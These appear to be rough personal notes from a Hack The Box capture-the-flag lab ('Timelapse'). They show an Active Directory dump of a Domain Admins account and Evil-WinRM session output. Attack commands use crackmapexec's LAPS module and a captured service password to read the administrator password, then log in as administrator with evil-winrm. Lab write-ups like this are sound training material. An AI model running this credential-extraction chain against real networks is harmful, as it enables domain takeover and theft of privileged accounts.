Country                              :
countryCode                          : 0
Created                              : 2/23/2022 5:43:45 PM
createTimeStamp                      : 2/23/2022 5:43:45 PM
Deleted                              :
Department                           :
Description                          :
DisplayName                          : TRX
DistinguishedName                    : CN=TRX,OU=Admins,OU=Staff,DC=timelapse,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {2/23/2022 5:46:40 PM, 2/23/2022 5:44:11 PM, 2/23/2022 5:43:45 PM, 12/31/1600 4:00:00 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : TRX
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               : 3/3/2022 7:06:26 PM
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 132928451046080760
LastLogonDate                        : 3/21/2022 8:07:28 PM
lastLogonTimestamp                   : 132923920486982020
LockedOut                            : False
logonCount                           : 45
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Domain Admins,CN=Users,DC=timelapse,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 3/21/2022 8:07:28 PM
modifyTimeStamp                      : 3/21/2022 8:07:28 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : TRX
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : user
ObjectGUID                           : 7f759230-0ed1-42fe-acc5-a930d35e3d9b
objectSid                            : S-1-5-21-671920749-559770252-3318990721-5101
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 2/23/2022 5:43:45 PM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132901406253212698
SamAccountName                       : TRX
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-5101
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
UserPrincipalName                    : TRX@timelapse.htb
uSNChanged                           : 114733
uSNCreated                           : 57370
whenChanged                          : 3/21/2022 8:07:28 PM
whenCreated                          : 2/23/2022 5:43:45 PM



*Evil-WinRM* PS C:\Users\legacyy\Documents>
whoam*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

```
Get-LAPSPasswords -DomainController 10.129.154.12 -Credential timelapse.htb\Administrator | Format-Table -AutoSize
```


```
 crackmapexec ldap 10.129.154.12 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' –kdcHost 10.129.154.12 -M laps
 ```

 password admin
 ```
 MK}68F7g2-6M92B0,QzZ-wW/
 ```

 ```bash
 evil-winrm -i 10.129.154.12 -P 8596 -u administrator -p 'MK}68F7g2-6M92B0,QzZ-wW/' -s '/home/bop/Workspace/hackthebox/timelapse/ps1_scripts/' -e '/home/bop/Workspace/hackthebox/timelapse/exe_files/' -S
 ```


 ```powershell
 *Evil-WinRM* PS C:\> Get-ChildItem -Filter *.txt -Recurse
 ```